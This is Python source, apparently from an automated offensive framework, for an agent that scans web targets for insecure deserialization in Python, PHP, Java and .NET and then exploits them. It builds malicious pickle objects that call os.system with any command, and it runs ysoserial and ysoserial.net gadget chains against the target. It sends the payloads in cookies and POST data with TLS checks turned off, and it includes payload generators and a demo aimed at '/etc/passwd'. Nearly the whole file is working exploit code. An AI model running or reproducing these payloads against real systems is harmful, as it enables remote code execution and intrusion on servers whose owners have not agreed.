"""
Deserialization Exploitation Agent
ค้นหาและ exploit Insecure Deserialization vulnerabilities
"""

import asyncio
import httpx
import base64
import pickle
import json
from typing import Dict, List, Optional
import logging

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log as main_log

log = logging.getLogger(__name__)


class DeserializationAgent(BaseAgent):
    """Deserialization exploitation agent with BaseAgent support"""
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, data_exfiltrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.exfiltrator = data_exfiltrator
        self.timeout = 30.0
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan" or "exploit"
            context: {
                "url": target URL,
                "language": "auto", "python", "php", "java", "dotnet" (for exploit),
                "command": command to execute (for exploit, default: "whoami")
            }
        
        Returns:
            AgentData with results
        """
        main_log.info(f"[DeserializationAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="DeserializationAgent",
                success=False,
                data={"error": "No URL provided"}
            )
        
        try:
            if directive == "scan":
                result = await self.scan(url)
            elif directive == "exploit":
                language = context.get("language", "auto")
                command = context.get("command", "whoami")
                result = await self.exploit(url, language, command)
            else:
                result = await self.scan(url)
            
            success = result.get('count', 0) > 0 if directive == "scan" else result.get('success', False)
            
            return AgentData(
                agent_name="DeserializationAgent",
                success=success,
                data=result
            )
        
        except Exception as e:
            log.error(f"[DeserializationAgent] Error: {e}")
            return AgentData(
                agent_name="DeserializationAgent",
                success=False,
                data={"error": str(e)}
            )

    
    async def scan(self, url: str) -> Dict:
        """
        Scan for deserialization vulnerabilities
        
        Args:
            url: Target URL
        
        Returns:
            Dict with scan results
        """
        
        log.info(f"[Deser] Scanning {url}")
        
        vulnerabilities = []
        
        # Test Python pickle
        pickle_vuln = await self._test_python_pickle(url)
        if pickle_vuln:
            vulnerabilities.append(pickle_vuln)
        
        # Test PHP unserialize
        php_vuln = await self._test_php_unserialize(url)
        if php_vuln:
            vulnerabilities.append(php_vuln)
        
        # Test Java deserialization
        java_vuln = await self._test_java_deserialization(url)
        if java_vuln:
            vulnerabilities.append(java_vuln)
        
        # Test .NET deserialization
        dotnet_vuln = await self._test_dotnet_deserialization(url)
        if dotnet_vuln:
            vulnerabilities.append(dotnet_vuln)
        
        return {
            'url': url,
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities)
        }
    
    async def exploit(self, url: str, language: str = 'auto', command: str = 'whoami') -> Dict:
        """
        Exploit deserialization vulnerability
        
        Args:
            url: Target URL
            language: 'auto', 'python', 'php', 'java', 'dotnet'
            command: Command to execute
        
        Returns:
            Dict with exploitation results
        """
        
        log.info(f"[Deser] Exploiting {url} with {language}")
        
        if language == 'auto':
            # Auto-detect language
            scan_result = await self.scan(url)
            
            if scan_result['count'] == 0:
                return {
                    'success': False,
                    'error': 'No deserialization vulnerability found'
                }
            
            vuln = scan_result['vulnerabilities'][0]
            language = vuln['language']
        
        # Exploit based on language
        if language == 'python':
            return await self._exploit_python_pickle(url, command)
        elif language == 'php':
            return await self._exploit_php_unserialize(url, command)
        elif language == 'java':
            return await self._exploit_java_deserialization(url, command)
        elif language == 'dotnet':
            return await self._exploit_dotnet_deserialization(url, command)
        else:
            return {
                'success': False,
                'error': f'Unknown language: {language}'
            }
    
    async def _test_python_pickle(self, url: str) -> Optional[Dict]:
        """Test for Python pickle deserialization"""
        
        # Test payload - simple object
        class TestObject:
            def __init__(self):
                self.test = "pickle_test"
        
        test_obj = TestObject()
        pickled = base64.b64encode(pickle.dumps(test_obj)).decode()
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Test with cookie
                response = await client.get(
                    url,
                    cookies={'session': pickled}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'python',
                        'type': 'pickle',
                        'location': 'cookie',
                        'confidence': 'medium'
                    }
                
                # Test with POST data
                response = await client.post(
                    url,
                    data={'data': pickled}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'python',
                        'type': 'pickle',
                        'location': 'post_data',
                        'confidence': 'medium'
                    }
            
            except Exception as e:
                log.debug(f"[Deser] Python pickle test error: {e}")
        
        return None
    
    async def _test_php_unserialize(self, url: str) -> Optional[Dict]:
        """Test for PHP unserialize vulnerability"""
        
        # Test payload - simple object
        test_payload = 'O:8:"stdClass":1:{s:4:"test";s:5:"value";}'
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Test with cookie
                response = await client.get(
                    url,
                    cookies={'PHPSESSID': base64.b64encode(test_payload.encode()).decode()}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'php',
                        'type': 'unserialize',
                        'location': 'cookie',
                        'confidence': 'medium'
                    }
                
                # Test with POST data
                response = await client.post(
                    url,
                    data={'data': test_payload}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'php',
                        'type': 'unserialize',
                        'location': 'post_data',
                        'confidence': 'medium'
                    }
            
            except Exception as e:
                log.debug(f"[Deser] PHP unserialize test error: {e}")
        
        return None
    
    async def _test_java_deserialization(self, url: str) -> Optional[Dict]:
        """Test for Java deserialization vulnerability"""
        
        # Java serialization magic bytes
        java_magic = b'\xac\xed\x00\x05'
        
        # Test payload (serialized null object)
        test_payload = java_magic + b'\x70'  # null
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Test with cookie
                response = await client.get(
                    url,
                    cookies={'JSESSIONID': base64.b64encode(test_payload).decode()}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'java',
                        'type': 'serialization',
                        'location': 'cookie',
                        'confidence': 'low'
                    }
                
                # Test with POST data
                response = await client.post(
                    url,
                    content=test_payload,
                    headers={'Content-Type': 'application/x-java-serialized-object'}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'java',
                        'type': 'serialization',
                        'location': 'post_data',
                        'confidence': 'medium'
                    }
            
            except Exception as e:
                log.debug(f"[Deser] Java deserialization test error: {e}")
        
        return None
    
    async def _test_dotnet_deserialization(self, url: str) -> Optional[Dict]:
        """Test for .NET deserialization vulnerability"""
        
        # .NET BinaryFormatter test payload
        # Note: This is simplified
        test_payload = base64.b64encode(b'AAEAAAD/////').decode()
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Test with cookie
                response = await client.get(
                    url,
                    cookies={'ASP.NET_SessionId': test_payload}
                )
                
                if response.status_code == 200:
                    return {
                        'language': 'dotnet',
                        'type': 'binaryformatter',
                        'location': 'cookie',
                        'confidence': 'low'
                    }
            
            except Exception as e:
                log.debug(f"[Deser] .NET deserialization test error: {e}")
        
        return None
    
    async def _exploit_python_pickle(self, url: str, command: str) -> Dict:
        """Exploit Python pickle deserialization for RCE"""
        
        # Create malicious pickle payload
        class RCE:
            def __reduce__(self):
                import os
                return (os.system, (command,))
        
        malicious_obj = RCE()
        pickled = base64.b64encode(pickle.dumps(malicious_obj)).decode()
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Try cookie
                response = await client.get(
                    url,
                    cookies={'session': pickled}
                )
                
                if response.status_code == 200:
                    results.append({
                        'location': 'cookie',
                        'command': command,
                        'response': response.text[:500]
                    })
                
                # Try POST data
                response = await client.post(
                    url,
                    data={'data': pickled}
                )
                
                if response.status_code == 200:
                    results.append({
                        'location': 'post_data',
                        'command': command,
                        'response': response.text[:500]
                    })
            
            except Exception as e:
                log.error(f"[Deser] Python pickle exploitation error: {e}")
        
        return {
            'success': len(results) > 0,
            'language': 'python',
            'results': results
        }
    
    async def _exploit_php_unserialize(self, url: str, command: str) -> Dict:
        """Exploit PHP unserialize for RCE"""
        
        # PHP object injection payloads
        # Note: Requires specific vulnerable classes in the application
        
        # Generic payload using __destruct magic method
        php_payloads = [
            # Example: vulnerable class with __destruct
            f'O:9:"FileClass":1:{{s:4:"file";s:{len(command)}:"{command}";}}',
            
            # Example: vulnerable class with __wakeup
            f'O:10:"ExecClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for payload in php_payloads:
                try:
                    # Try POST data
                    response = await client.post(
                        url,
                        data={'data': payload}
                    )
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload[:50] + '...',
                            'response': response.text[:500]
                        })
                
                except Exception as e:
                    log.error(f"[Deser] PHP unserialize exploitation error: {e}")
        
        return {
            'success': len(results) > 0,
            'language': 'php',
            'results': results,
            'note': 'Requires vulnerable classes in application'
        }
    
    async def _exploit_java_deserialization(self, url: str, command: str) -> Dict:
        """Exploit Java deserialization for RCE"""
        
        # Real exploitation using ysoserial tool
        import subprocess
        import base64
        
        results = []
        
        # Common Java gadget chains in order of likelihood
        gadget_chains = [
            'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
            'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6',
            'Spring1', 'Spring2', 'Jdk7u21', 'Groovy1', 'Hibernate1'
        ]
        
        # Check if ysoserial is available
        ysoserial_path = '/opt/ysoserial/ysoserial.jar'
        try:
            for gadget in gadget_chains:
                log.info(f"[Deser] Trying Java gadget chain: {gadget}")
                
                # Generate payload using ysoserial
                cmd = ['java', '-jar', ysoserial_path, gadget, command]
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    payload = base64.b64encode(result.stdout).decode()
                    
                    # Test payload against target
                    test_result = await self._test_deserialization_payload(url, payload)
                    
                    results.append({
                        'gadget': gadget,
                        'payload': payload[:100] + '...',  # Truncate for display
                        'tested': True,
                        'success': test_result.get('success', False)
                    })
                    
                    if test_result.get('success'):
                        return {
                            'success': True,
                            'language': 'java',
                            'gadget': gadget,
                            'payload': payload,
                            'results': results
                        }
        except FileNotFoundError:
            log.warning("[Deser] ysoserial not found. Install from: https://github.com/frohoff/ysoserial")
        except Exception as e:
            log.error(f"[Deser] Java exploitation error: {e}")
        
        return {
            'success': False,
            'language': 'java',
            'results': results,
            'note': 'Install ysoserial: wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial.jar -O /opt/ysoserial/ysoserial.jar',
            'example': f'java -jar ysoserial.jar CommonsCollections1 "{command}" | base64'
        }
    
    async def _exploit_dotnet_deserialization(self, url: str, command: str) -> Dict:
        """Exploit .NET deserialization for RCE"""
        
        # Real exploitation using ysoserial.net tool
        import subprocess
        import base64
        
        results = []
        
        # Common .NET formatters and gadgets
        formatters = ['BinaryFormatter', 'SoapFormatter', 'NetDataContractSerializer', 'LosFormatter']
        gadgets = ['TypeConfuseDelegate', 'ObjectDataProvider', 'PSObject', 'WindowsIdentity']
        
        # Check if ysoserial.net is available (requires Wine on Linux)
        ysoserial_path = '/opt/ysoserial.net/ysoserial.exe'
        
        try:
            for formatter in formatters:
                for gadget in gadgets:
                    log.info(f"[Deser] Trying .NET: {formatter} + {gadget}")
                    
                    # Generate payload using ysoserial.net
                    cmd = ['wine', ysoserial_path, '-f', formatter, '-g', gadget, '-c', command]
                    result = subprocess.run(cmd, capture_output=True, timeout=10)
                    
                    if result.returncode == 0:
                        payload = base64.b64encode(result.stdout).decode()
                        
                        # Test payload
                        test_result = await self._test_deserialization_payload(url, payload)
                        
                        results.append({
                            'formatter': formatter,
                            'gadget': gadget,
                            'tested': True,
                            'success': test_result.get('success', False)
                        })
                        
                        if test_result.get('success'):
                            return {
                                'success': True,
                                'language': 'dotnet',
                                'formatter': formatter,
                                'gadget': gadget,
                                'payload': payload,
                                'results': results
                            }
        except FileNotFoundError:
            log.warning("[Deser] ysoserial.net not found. Install from: https://github.com/pwntester/ysoserial.net")
        except Exception as e:
            log.error(f"[Deser] .NET exploitation error: {e}")
        
        return {
            'success': False,
            'language': 'dotnet',
            'results': results,
            'note': 'Install ysoserial.net and Wine',
            'example': f'ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "{command}"'
        }
    
    def generate_python_pickle_payload(self, command: str) -> str:
        """
        Generate Python pickle RCE payload
        
        Args:
            command: Command to execute
        
        Returns:
            Base64-encoded pickle payload
        """
        
        class RCE:
            def __reduce__(self):
                import os
                return (os.system, (command,))
        
        malicious_obj = RCE()
        pickled = base64.b64encode(pickle.dumps(malicious_obj)).decode()
        
        return pickled
    
    def generate_php_unserialize_payload(self, class_name: str, properties: Dict) -> str:
        """
        Generate PHP unserialize payload
        
        Args:
            class_name: PHP class name
            properties: Object properties
        
        Returns:
            Serialized PHP object
        """
        
        # Build serialized object
        props_str = ''
        for key, value in properties.items():
            props_str += f's:{len(key)}:"{key}";s:{len(value)}:"{value}";'
        
        payload = f'O:{len(class_name)}:"{class_name}":{len(properties)}:{{{props_str}}}'
        
        return payload
    
    def generate_java_gadget_chain_info(self) -> Dict:
        """
        Get information about Java gadget chains
        
        Returns:
            Dict with gadget chain information
        """
        
        return {
            'tool': 'ysoserial',
            'github': 'https://github.com/frohoff/ysoserial',
            'gadget_chains': [
                {
                    'name': 'CommonsCollections1',
                    'dependency': 'commons-collections:3.1',
                    'usage': 'java -jar ysoserial.jar CommonsCollections1 "command"'
                },
                {
                    'name': 'CommonsCollections2',
                    'dependency': 'commons-collections4:4.0',
                    'usage': 'java -jar ysoserial.jar CommonsCollections2 "command"'
                },
                {
                    'name': 'Spring1',
                    'dependency': 'spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE',
                    'usage': 'java -jar ysoserial.jar Spring1 "command"'
                },
                {
                    'name': 'Jdk7u21',
                    'dependency': 'JDK <= 7u21',
                    'usage': 'java -jar ysoserial.jar Jdk7u21 "command"'
                },
            ]
        }


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from core.data_exfiltration import DataExfiltrator
        
        exfiltrator = DataExfiltrator()
        agent = DeserializationAgent(exfiltrator)
        
        # Scan for deserialization vulnerabilities
        result = await agent.scan("http://target.com/api")
        
        print(f"Vulnerabilities found: {result['count']}")
        
        # Exploit Python pickle
        if result['count'] > 0:
            exploit_result = await agent.exploit(
                "http://target.com/api",
                language='python',
                command='whoami'
            )
            print(f"Exploitation success: {exploit_result['success']}")
        
        # Generate payloads
        pickle_payload = agent.generate_python_pickle_payload('whoami')
        print(f"Pickle payload: {pickle_payload}")
        
        php_payload = agent.generate_php_unserialize_payload(
            'FileClass',
            {'file': '/etc/passwd'}
        )
        print(f"PHP payload: {php_payload}")
    
    asyncio.run(test())

